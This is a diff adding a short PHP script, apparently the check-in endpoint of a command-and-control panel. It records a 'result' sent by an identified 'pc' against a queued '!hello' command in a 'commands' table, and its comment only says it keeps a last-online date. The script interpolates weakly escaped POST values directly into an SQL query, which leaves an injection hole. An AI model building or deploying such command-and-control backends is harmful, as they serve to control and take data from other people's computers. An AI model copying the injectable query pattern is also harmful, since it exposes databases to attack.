@@ -1,0 +1,1 @@
+<?php # keep last online date include("conn.php");if(isset($_POST['pc'])) {$pc=addslashes(html_entity_decode($_POST['pc']));       }if(isset($_POST['result'])) {$result=addslashes(html_entity_decode($_POST['result'])); }mysqli_query($bdd, "UPDATE commands SET result='$result' WHERE cmd='!hello' AND pc='$pc' LIMIT 1");mysqli_close($bdd); ?>
